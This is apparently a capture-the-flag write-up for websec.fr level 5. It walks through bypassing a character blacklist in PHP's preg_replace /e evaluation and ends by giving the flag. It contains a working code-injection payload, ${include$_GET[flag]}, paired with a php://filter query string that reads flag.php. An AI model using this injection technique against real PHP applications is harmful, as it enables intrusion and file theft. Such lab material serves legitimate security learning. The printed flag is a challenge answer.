# Level 5

1. First, lets check what is written in http://websec.fr/level05/source.php
2. Then, check the code here : 
    ```
    $blacklist = implode (["'", '"', '(', ')', ' ', '`']);
    $corrected = preg_replace ("/([^$blacklist]{2,})/ie", 'correct ("\\1")', $q);
    ```
    Now, we have to check what is "preg_replace" : https://www.php.net/manual/en/function.preg-replace.php
    So, we know that if we input something which is forbidden, then we won't get informations we want, cuz those critical commands will be replaced. To check the truth, lets input
    ```
    ${blacklist}
    ```
    And the result is : 
    ```
    '"() `
    ```
    Here is the website you need : https://www.tutorialspoint.com/php/php_regular_expression.html
3. Now, we have to think of a payload that cannot be replaced. Such as "file_get_contents()" can't be our payload cuz "(" and ")", and we have to pass the filter. Then, I pop out an idea, if we can use 
    ```
    php://filter/convert.base64-encode/resource=flag.php
    ```
    to get the base64 flag, the only thing we need is a payload that can read the file without those in the blacklist.
5. After digging deep into those documents of php, I found that "include" or "require" is the command we want, and we need to do a trick thing that can get the flag by the query string below : 
    ```
    ?flag=php://filter/convert.base64-encode/resource=flag.php
    ```
    And the critical payload : 
    ```
    ${include$_GET[flag]}
    ```
    Then, it will return the base64-encode flag to us and then you can easily decode it of course.
6. Here is the flag : WEBSEC{Writing_a_sp3llcheckEr_in_php_aint_no_fun}
